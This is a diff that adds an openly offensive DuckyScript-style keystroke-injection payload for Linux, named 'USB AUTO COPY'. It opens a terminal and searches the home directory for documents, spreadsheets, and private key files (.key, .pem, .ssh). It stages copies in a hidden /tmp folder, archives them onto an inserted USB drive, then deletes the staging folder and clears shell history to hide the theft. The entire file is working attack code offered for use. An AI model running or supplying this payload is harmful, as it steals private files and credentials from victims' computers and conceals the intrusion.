@@ -1,0 +1,49 @@
+# ============================================
+# USB AUTO COPY - Automatic Exfiltration
+# ============================================
+# Purpose: Copy interesting files automatically on USB insert
+# Target: Any system with USB
+# Time: Continuous (runs on insert)
+# Author: D3n14l0f53rv1c3
+# ============================================
+# This payload runs when USB is inserted
+# It automatically copies interesting files
+
+# For Linux:
+DELAY 2000
+CTRL ALT T
+DELAY 1000
+
+STRING mkdir -p /tmp/.usb_copy
+ENTER
+DELAY 100
+
+# Wait for USB
+STRING while true; do
+ENTER
+STRING   USB=$(ls /media/$USER/*/ 2>/dev/null | head -1)
+ENTER
+STRING   if [ -n "$USB" ]; then
+ENTER
+STRING     # Copy interesting files
+ENTER
+STRING     find ~ -type f \( -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.key" -o -name "*.pem" -o -name "*.ssh" \) -exec cp {} /tmp/.usb_copy/ \; 2>/dev/null
+ENTER
+STRING     # Compress and copy to USB
+ENTER
+STRING     tar czf "$USB/exfil_$(date +%Y%m%d_%H%M%S).tar.gz" -C /tmp .usb_copy
+ENTER
+STRING     break
+ENTER
+STRING   fi
+ENTER
+STRING   sleep 1
+ENTER
+STRING done
+ENTER
+DELAY 100
+
+STRING rm -rf /tmp/.usb_copy
+ENTER
+STRING history -c; exit
+ENTER
